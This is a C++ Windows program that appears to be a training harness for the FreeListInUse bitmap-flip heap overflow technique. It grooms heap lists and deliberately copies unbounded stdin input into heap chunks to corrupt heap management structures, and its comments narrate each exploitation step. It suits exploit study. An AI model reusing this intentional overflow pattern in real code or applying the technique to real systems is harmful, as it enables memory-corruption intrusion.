// HeapOverflowsBitmapFlipAttack.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
int main(int argc,char *argv[])
{
    HLOCAL a,b,c,d,e,f,g,h,i,j,k,l,m,trigger,x,y,w,u,z,q,o;
    HANDLE hHeap;
 
    hHeap = HeapCreate(0x00040000,0,0);

	int first = 0x3*8-0x8;
	int sec = 0x70; // set to +1

	int second = sec*8-0x8;
	int ret = (sec+1)*8-0x8;
 
    a = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
    b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
    c = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
    d = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
 
    e = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
    f = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first); // forces onto freelist[0x3] because two busy chunks exist
    g = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first); // around the chunk
 
    // allocate for freelist[0x7b]
    z = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second);
    x = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second);
    y = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second);
    w = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second);
 
    q = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second);
    u = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second); // forces onto freelist[0x7b] because two busy chunks exist
    o = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second); // around the chunk
 
    // fill lookaside[0x3]
    HeapFree(hHeap, 0, a);
    HeapFree(hHeap, 0, b);
    HeapFree(hHeap, 0, c);
    HeapFree(hHeap, 0, d);
 
    // insert into freelist[0x3]
    HeapFree(hHeap, 0, f);
 
    printf("(+) Chunk e: 0x%08x\n",e);
    printf("(+) Fill chunk e (using 16 bytes), overflowing into chunk f (0x%08x) by 1 byte:\n",e);
    printf("(+) Overflow with size 0x7c (AAAAAAAAAAAAAAAA|)...\n");

	char buf[32];
	fgets(buf,32,stdin);

	__asm { int 0x3 };

    memcpy(e, buf, strlen(buf));
 
    // remove the chunks on the lookaside
    h = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
    i = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
    j = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
    k = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
 
    // this is where we flip the bitmap. FreelistInUse [0x7c] = 1
    l = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
 
    // fill lookaside[0x7b]
    HeapFree(hHeap, 0, z);
    HeapFree(hHeap, 0, x);
    HeapFree(hHeap, 0, y);
    HeapFree(hHeap, 0, w);
 
    // insert into freelist[0x7b]
    HeapFree(hHeap, 0, u);
 
    // return the chunk that points to itself in freelist[0x7c], so we can overwrite management structures...
    m = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,ret);
 
    printf("(+) Fill chunk m and destroy the management structure:\n");
	char buf2[0x1000];
	fgets(buf2,0x1000,stdin);
    memcpy(m, buf2, 0x1000);
 
    // force the heap to be extended triggering RtlCommitRoutine
    trigger = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,4096);
 
    exit(0);
}
